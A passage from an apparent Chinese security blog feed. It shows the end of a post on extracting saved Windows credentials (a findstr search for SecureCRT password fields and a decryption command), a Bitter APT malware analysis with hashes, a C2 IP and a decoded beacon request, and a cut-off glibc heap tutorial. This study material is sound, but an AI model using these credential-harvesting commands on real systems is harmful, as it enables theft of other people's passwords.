/c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password V2\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/23.png" alt="image-20210611163435588"></p><p>然后使用上面脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#注意去除hash的前面三位 &quot;02:&quot;</span><br><span class="line">python3  SecureCRT.py dec -v2 hash</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/WindowsGrabPassword/24.png" alt="image-20210611163621590"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://redteam.today/2019/12/09/%E4%BD%BF%E7%94%A8mimikatz%E5%AF%BC%E5%87%BAchrome%E5%AF%86%E7%A0%81/</span><br><span class="line">https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E7%A6%BB%E7%BA%BF%E5%AF%BC%E5%87%BAChrome%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81</span><br><span class="line">https://github.com/tianhe1986/FatSmallTools</span><br><span class="line">https://github.com/kinnisoy/GetChromePassword</span><br><span class="line">https://github.com/dzxs/Xdecrypt</span><br><span class="line">https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/</span><br><span class="line">https://www.cnblogs.com/Yang34/p/14237114.html</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</title>
    <link href="https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/"/>
    <id>https://www.ascotbe.com/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/</id>
    <published>2021-05-18T15:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>开个新坑，学习下样本分析看看有什么好的免杀技术能够让我整合的，第一篇文章就参考<a href="https://bbs.pediy.com/thread-249319.htm">Crazyman</a>师傅写文章的和网上各个沙箱的已有的内容</p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/1.png" alt="image-20210519180644203" style="zoom: 50%;" /><blockquote><p>样本</p></blockquote><table><thead><tr><th align="left">文件类型</th><th align="left">PE32 executable (console) Intel 80386, for MS Windows</th></tr></thead><tbody><tr><td align="left">文件大小</td><td align="left">31KB</td></tr><tr><td align="left">MD5</td><td align="left">8d42c01180be7588a2a68ad96dd0cf85</td></tr><tr><td align="left">SHA1</td><td align="left">89a7861acb7983ad712ae9206131c96454a1b3d8</td></tr><tr><td align="left">SHA256</td><td align="left">0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0</td></tr><tr><td align="left">时间戳</td><td align="left">0x5C32FC2B (Mon Jan 07 15:13:47 2019)</td></tr><tr><td align="left">PDB</td><td align="left">c:\Users\Asterix\Documents\Visual Studio 2008\Projects\28NovDwn\Release\28NovDwn.pdb</td></tr><tr><td align="left">数据</td><td align="left"><a href="https://github.com/Ascotbe/SampleAnalysis/tree/master/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0">样本和IDA数据库下载</a></td></tr></tbody></table><blockquote><p>沙箱数据</p></blockquote><ul><li><p><a href="https://app.any.run/tasks/7ef05c98-a4d4-47ff-86e5-8386f8787224/">any.run</a></p></li><li><p><a href="https://www.virustotal.com/gui/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/details">virustotal</a></p></li><li><p><a href="https://s.threatbook.cn/report/file/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/?sign=history&env=win7_sp1_enx86_office2013">threatbook</a></p></li></ul><h2 id="开始分析"><a href="#开始分析" class="headerlink" title="开始分析"></a>开始分析</h2><p>先在前面放几个经常用到的文档和x64gdb相关插件</p><ul><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/s3f49ktz(v=vs.120)">数据类型范围</a></p></li><li><p><a href="https://docs.microsoft.com/zh-cn/previous-versions/2e6a4at9%28v%3dvs.120%29">C++ 关键字</a></p></li><li><p><a href="https://github.com/horsicq/x64dbg-Plugin-Manager">X64DBG插件安装器</a></p></li><li><p><a href="https://github.com/bootleg/ret-sync">IDA和X64GDB联动</a></p></li><li><p>CSIDL values</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://tarma.com/support/im9/using/symbols/functions/csidls.htm</span><br><span class="line">https://www.nirsoft.net/articles/find_special_folder_location.html</span><br><span class="line">https://docs.microsoft.com/en-us/windows/win32/shell/csidl</span><br></pre></td></tr></table></figure></li></ul><p>本文对样本静态和动态同步分析，样本拿来先丢到pestudio中看下数据，结果在里面看到了PDB的路径</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/2.png" alt="image-20210518154946052"></p><p>接着丢IDA中分析，首先找到WinMain函数，可以看到第9行有一个自定义函数<strong>sub_401140</strong></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/3.png" alt="image-20210518170332795"></p><p>进入函数<strong>sub_401140</strong>可以看到就是一个注册窗口相关的，该函数第7行的<strong>sub_4011D0</strong>是用来处理窗口的</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/4.png" alt="image-20210518170458445"></p><p><strong>sub_4011D0</strong>内容如下</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/5.png" alt="image-20210518171307047"></p><p>接着我们回到WinMain函数，从第9行到第17行的内容看截图的注释就能明白了，我们重点看<strong>sub_401330</strong>函数，进入函数中看到281行和282行创建了<code>c:\\intel\\</code>路径</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/6.png" alt="image-20210519171938860"></p><p>接着往下看</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/7.png" alt="image-20210519172132691"></p><p>在332行中有个<strong>sub_403B00</strong>函数，函数大概的意思就是还是创建一个文件夹，下图是该函数的有用的内容</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/8.png" alt="image-20210519094603305"></p><p>339行的<strong>sub_401F00</strong>是一个注册列表函数，我们进到函数里面中分析</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/9.png" alt="image-20210519151517317"></p><p>接着动态调试到这个点时，看注册列表内容</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/10.png" alt="image-20210519160539252"></p><p>我们回到调用函数中继续跟</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/11.png" alt="image-20210523160455000"></p><p>接着到355行可以看到下图的动态调试结果，是打开了开机运行值中</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/12.png" alt="image-20210521173911417"></p><p>然后356行创建了一个多线程，运行的函数为<code>StartAddress</code> ，我们进入到该函数中查看，函数内容如下图</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/13.png" alt="image-20210523154624779"></p><p>可以看到是想从系统环境变量模块中获取到<code>ComSpec</code>的值，我们动态调试解出来是为<code>C:\\WINDOWS\\system32\\cmd.exe</code></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/14.png" alt="image-20210523152111955"></p><p>然后我们找一台正常的机器来看看是否是都是这个值</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/15.png" alt="image-20210523152003130"></p><p>接着调试，可以看到其实是做了一个copy自身到<code>C:\\intel\\msdtcv.exe</code>位置，下图可以看到内容结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/16.png" alt="image-20210521174629776"></p><p>我们接着看到火绒剑，可以看到CMD进行读写操作</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/17.png" alt="image-20210523155647085"></p><p>然后我们接着跟进到360行的<code>sub_404670</code>中，可以看到就这写入开机启动项</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/18.png" alt="image-20210523162935781"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/19.png" alt="image-20210523163026875"></p><p>接着往下看366行开始到412行都是获取系统相关内容</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/20.png" alt="image-20210523170708184"></p><p>接着跟到469行<code>sub_402BA0</code>函数为下载核心函数，由于服务器已经关了，无法动态分析，大概的内容就是下载函数到<code>C:\Users\ascotbe\AppData\Local\Microsoft\Windows</code>目录然后执行该函数</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/21.png" alt="image-20210523171312548"></p><p>由于不能分析返回以后的功能，那么我们回到423行，进入函数<code>sub_402890</code>分析请求了什么东西</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/22.png" alt="image-20210523171517787"></p><p>动态调试可以看到下图，微步获取到的ip为<strong>162.222.215.90</strong>和我获取到的不同，该进程应该是有个IP池（猜测），如果获取不到，就会换一个IP来请求</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/23.png" alt="image-20210523165338427"></p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/24.png" alt="image-20210523172312854"></p><p>通过解码得到如下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /ourtyaz/qwe.php?TIe=4fc5fce9.8958.5:68.b76:.df147:ee9526*EFTLUPQ.V:OIKG8*22ACme;!7/3/:311! HTTP/1.1</span><br><span class="line">Host: frameworksupport.net</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>那么分析就结束了，踩了好多坑，但是学到了挺多的东西很开心~</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/25.png" alt="image-20210523172602903"></p>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux堆溢出总结（0x01）</title>
    <link href="https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/"/>
    <id>https://www.ascotbe.com/2021/05/04/HeapOverflow_Linux_0x01/</id>
    <published>2021-05-04T15:45:42.000Z</published>
    <updated>2022-01-10T03:06:02.000Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>HVV结束，终于能闲下来学习了，开新坑啦<del>好耶</del></p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/1.gif" alt="4E2FEA9B95DD08A1A4A30E8A3E4B9C63" style="zoom:33%;" /><blockquote><p>记个小知识点</p></blockquote><ul><li><p>libc是Linux下的ANSI C函数库。</p></li><li><p><a href="http://www.gnu.org/software/libc/">glibc</a>是Linux下的GUN C函数库。</p></li></ul><p>Linux下原来的标准c库Linux libc逐渐不再被维护。Linux下面的标准c库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在&#x2F;lib目录下的.so文件为libc.so.6。</p><h2 id="堆内存管理机制介绍"><a href="#堆内存管理机制介绍" class="headerlink" title="堆内存管理机制介绍"></a>堆内存管理机制介绍</h2><p>不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：</p><table><thead><tr><th align="center">平台</th><th align="center">堆内存分配机制</th></tr></thead><tbody><tr><td align="center">General purpose allocator</td><td align="center">dlmalloc</td></tr><tr><td align="center">glibc</td><td align="center">ptmalloc2</td></tr><tr><td align="center">free BSD and Firefox</td><td align="center">jemalloc</td></tr><tr><td align="center">Google</td><td align="center">tcmalloc</td></tr><tr><td align="center">Solaris</td><td align="center">libumem</td></tr></tbody></table><p>在 Linux 的 <code>glibc</code> 使用的 <code>ptmalloc2</code> 实现原理。本来 Linux 默认的是 <code>dlmalloc</code>，但是由于其不支持多线程堆管理，所以后来被支持多线程的 <code>prmalloc2</code> 代替了。当然在 Linux 平台上的 <code>malloc</code> 函数本质上都是通过系统调用 <code>brk</code> 或者 <code>mmap</code> 实现的。</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/2.png" alt="img"></p><p>进程的虚拟内存分布示意图(32位系统的进程虚拟内存分布)：</p><ul><li>在Linux 2.6.7之前的布局</li><li>堆只有1G虚拟空间</li></ul><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/3.png" alt="img"></p><p>任何应用都可以调用 Linux 的 <code>mmap</code> 系统调用，或者 Windows 的 <code>CreateFileMapping</code>&#x2F;<code>MapViewOfFile</code>，向操作系统申请内存映射。内存映射是一个很方便、高效的做文件 IO 的方式, 所以一般用来加载动态链接库（dynamic libraries），也可以创建一块匿名的映射内存，不对应任何文件，在程序中使用。</p><p>进程的虚拟内存分布示意图(64位系统的进程虚拟内存分布)：</p><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/19.png" alt="2"></p><h2 id="堆内存分配实验"><a href="#堆内存分配实验" class="headerlink" title="堆内存分配实验"></a>堆内存分配实验</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test_malloc.cpp</span></span><br><span class="line"><span class="comment">//clang++ -std=c++11 test_malloc.cpp -lpthread</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span>* <span class="title">ThreadFunc</span><span class="params">(<span class="type">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="type">char</span>* addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in thread 1\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="type">pthread_t</span> t1;</span><br><span class="line">        <span class="type">void</span>* s;</span><br><span class="line">        <span class="type">int</span> ret;</span><br><span class="line">        <span class="type">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Welcome to per thread arena example::%d\n&quot;</span>,<span class="built_in">getpid</span>());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Before malloc in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        addr = (<span class="type">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After malloc and before free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;After free in main thread\n&quot;</span>);</span><br><span class="line">        <span class="built_in">getchar</span>();</span><br><span class="line">        ret = <span class="built_in">pthread_create</span>(&amp;t1, <span class="literal">NULL</span>, ThreadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread creation error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = <span class="built_in">pthread_join</span>(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Thread join error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="主线程-malloc-之前"><a href="#主线程-malloc-之前" class="headerlink" title="主线程 malloc 之前"></a>主线程 malloc 之前</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/4.png" alt="image-20210505225640027"></p><p>可以看到，在本机上（Ubuntu16.04，x64），在主线程调用 <code>malloc</code> 之前，就已经给主线程分配了一块堆内存，这块<strong>默认大小的内存是 200 KB</strong>。</p><p>堆区内存位置是紧接着数据段的，并且<strong>offset</strong>的值为<strong>00000000</strong>，说明这个系统是通过 <code>brk</code> 进行内存分配的。</p><h3 id="主线程-malloc-之后"><a href="#主线程-malloc-之后" class="headerlink" title="主线程 malloc 之后"></a>主线程 malloc 之后</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/5.png" alt="image-20210505231259039"></p><p>在主线程中调用 <code>malloc</code> 之后，发现 <strong>堆的大小仍然是 200K</strong>，因此 <code>malloc</code> 并没有引起堆区总容量的自增长。</p><div class="note info modern"><p>作者原文中有一种解释（32位）：还可以看出虽然我们只申请了1000bytes的数据，但是系统却分配了132KB大小的堆，这是为什么呢？原来这132KB的堆空间叫做<strong>arena</strong>，此时因为是主线程分配的，所以叫做<strong>main arena</strong>（每个<strong>arena</strong>中含有多个<strong>chunk</strong>，这些<strong>chunk</strong>以链表的形式加以组织)。由于132KB比1000bytes大很多，所以主线程后续再申请堆空间的话，就会先从这132KB的剩余部分中申请，直到用完或不够用的时候，再通过增加<strong>program break location</strong>的方式来增加<strong>main arena</strong>的大小。同理，当<strong>main arena</strong>中有过多空闲内存的时候，也会通过减小<strong>program break location</strong>的方式来缩小<strong>main arena</strong>的大小。</p></div><h3 id="主线程-free-之后"><a href="#主线程-free-之后" class="headerlink" title="主线程 free 之后"></a>主线程 free 之后</h3><p>主线程调用 <code>free</code> 之后，堆内存分布未发生改变</p><div class="note info modern"><p>原文也给出了解释（32位）：在主线程调用<code>free</code>之后，从内存布局可以看出程序的堆空间并没有被释放掉，因为调用<code>free</code>函数释放已经分配了的空间并非直接“返还”给系统，而是由<code>glibc</code>的<code>malloc</code>库函数加以管理。它会将释放的<strong>chunk</strong>（称为<strong>free chunk</strong>）添加到 <strong>main arena</strong> 的 <strong>bin</strong>（这是一种用于存储同类型<strong>free chunk</strong> 的双链表数据结构，后面会加以详细介绍）中。在这里，记录空闲空间的 <strong>free list</strong> 数据结构称之为 <strong>bins</strong>。之后当用户再次调用 <code>malloc</code> 申请堆空间的时候，<code>glibc</code>的 <code>malloc</code> 会先尝试从 <strong>bin</strong> 中找到一个满足要求的 <strong>chunk</strong> ，如果没有才会向操作系统申请新的堆空间。</p></div><h3 id="子线程-malloc-之前"><a href="#子线程-malloc-之前" class="headerlink" title="子线程 malloc 之前"></a>子线程 malloc 之前</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/6.png" alt="image-20210506110331027"></p><p>红色框这一部分地址可以看出，<strong>在子线程 <code>malloc</code> 之前，已经创建了子线程的栈，或者说子线程创建时就在内存映射区上创建了该线程的栈空间，其默认大小是 8MB</strong>。</p><div class="note info modern"><p><strong>Linux 子线程是由 mmap 创建的，所以其栈是位于内存映射区区域</strong></p></div><h3 id="子线程-malloc-之后"><a href="#子线程-malloc-之后" class="headerlink" title="子线程 malloc 之后"></a>子线程 malloc 之后</h3><p><img src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/HeapOverflow/7.png" alt="image-20210506135215497"></p><p>在 <code>malloc</code> 之后，为子线程分配了堆区，这个大小是 132K，并且同样是位于内存映射区，这部分区域就是 thread1 的堆空间，即 thread1 的 <strong>arena</strong>。同时还要注意，子线程分配的空间是内存映射区向下增长的，也就是向堆区增长。</p><p>所以可以确定的是，<strong>子线程的堆栈都是分配在内存映射区和堆区之间的区域</strong>（也可以理解为就是分配在内存映射区，因为内存映射区和堆区都是动态增长的，内存映射区向下增长，堆区向上增长）。从虚拟内存的分布图中我们可以看到，在 3GB 的用户进程空间中，地址最高处的栈所占用的比较少（主线程的栈一般是 16MB 或者 8MB），然后内存映射区也不大，而初始化的堆区也很小。所以内存映射区和堆之间的区域是非常大的。</p><h3 id="子线程-free-之后"><a href="#子线程-free-之后" class="headerlink" title="子线程 free 之后"></a>子线程 free 之后</h3><p>同主线程类似，并没有立即回收。</p><h2 id="brk和mmap的区别"><a href="#brk和mmap的区别" class="headerlink" title="brk和mmap的区别"></a>brk和mmap的区别</h2><p>从操作系统角度来看，进程分配内存有两种方式，分别由两个系统调用完成：brk和mmap（不考虑共享内存）。</p><ul><li><p>brk是将数据段(.data)的最高地址指针_edata往高地址推；</p></li><li><p>mmap是在进程的虚拟地址空间中（堆和栈中间，称为<strong>文件映射区域</strong>的地方）找一块空闲的虚拟内存。</p></li></ul><p>这两种方式分配的都是<strong>虚拟内存</strong>，没有分配物理内存。在第一次访问已分配的虚拟地址空间的时候，发生缺页中断，操作系统负责分配物理内存，然后建立虚拟内存和物理内存之间的映射关系。</p><p>在标准C库中，提供了malloc&#x2F;free函数分配释放内存，这两个函数底层是由brk，mmap，munmap这些系统调用实现的。</p><h2 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p><strong>arena</strong>原本的翻译是竞技场，这个词非常巧妙的表现了堆中内存的管理的思路。前文提到，每个线程都有一个自己的<strong>arena</strong>用于堆内存的分配，这个区域是调用<code>malloc</code>的时候从操作系统获得的，一般情况下比实际<code>malloc</code>要大一些，当下次再次调用<code>malloc</code>，可以直接从<strong>arena</strong>中进行堆内存分配。</p><blockquote><p><strong>arena</strong>分为<strong>thread arena</strong>（可以包含多个 <strong>heap</strong>）和<strong>main arena</strong>（只包含一个可以自增长的 <strong>heap</strong>），每个<strong>heap</strong> 被分为多个 <strong>chunk</strong></p></blockquote><h3 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h3><p>对于不同系统，arena 数量的<a href="https://github.com/lattera/glibc/blob/master/malloc/arena.c#L888">约束</a>如下</p><table><thead><tr><th align="center">systems</th><th align="center">number of arena</th></tr></thead><tbody><tr><td align="center">32bits</td><td align="center">2 x number of cpu cores + 1</td></tr><tr><td align="center">64bits</td><td align="center">8 x number of cpu cores + 1</td></tr></tbody></table><h3 id="arena-管理"><a href="#arena-管理" class="headerlink" title="arena 管理"></a>arena 管理</h3><p>假设有如下情景：一台只含有一个处理器核心的机器安装有 32 位操作系统，其上运行了一个多线程应用程序，共含有 4 个线程——主线程和三个子线程。显然线程个数大于系统能维护的最大 <strong>arena</strong> 个数（2 x 核心数 + 1&#x3D; 3），那么此时 <code>glibc</code> 的 <code>malloc</code> 就需要确保这 4 个线程能够正确地共享这 3 个 <strong>arena</strong>，那么它是如何实现的呢？</p><p>当主线程首次调用 <code>malloc</code> 的时候会直接为它分配一个 <strong>main arena</strong>，而不需要任何附加条件。</p><p>当子线程 1 和子线程 2 首次调用 <code>malloc</code> 的时候，<code>glibc</code> 实现的 <code>malloc</code> 会分别为每个子线程创建一个新的 <strong>thread arena</strong>。此时，各个线程与 <strong>arena</strong> 是一一对应的。但是，当用户线程 3 调用 <code>malloc</code> 的时候就出现问题了。因为此时 <code>glibc</code> 的 <code>malloc</code> 能维护的 <strong>arena</strong> 个数已经达到上限，无法再为子线程 3 分配新的 <strong>arena</strong> 了，那么就需要重复使用已经分配好的 3 个 <strong>arena</strong> 中的一个（<strong>main arena</strong>, 